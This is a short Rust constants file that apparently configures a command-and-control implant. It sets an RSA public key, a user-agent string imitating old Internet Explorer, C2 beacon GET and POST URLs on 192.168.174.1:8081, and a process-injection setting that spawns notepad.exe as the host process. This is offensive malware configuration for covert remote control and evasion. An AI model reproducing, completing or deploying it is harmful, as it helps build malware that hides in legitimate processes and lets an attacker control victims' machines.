pub const PUB_KEY: &str = "-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCb6D4c987h2IHHo3sjVcTVzZq6
uq36gh854b3J8WNhG44pJo+IUq0bSU+7OPlrspVhcfc1J8pmmNP9ruyv3Iv5IE0N
DGu4Z1aHKGKZEMqeBUR2VXDMmiTK70Z9HKL41p2a78cPVqm7eOqpa6U6yT24HXaH
3MJTIAvmoQVy13+mXQIDAQAB
-----END PUBLIC KEY-----";
pub const USER_AGENT: &str =
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; Avant Browser)";
pub const C2_GET_URL: &str = "http://192.168.174.1:8081/fwlink";
pub const C2_POST_URL: &str = "http://192.168.174.1:8081/submit.php?id=";
// 是否注入自身
pub const INJECT_SELF: bool = false;
// 要注入的进程
pub const SPAWN_PROCESS: &str = "C:\\Windows\\System32\\notepad.exe";
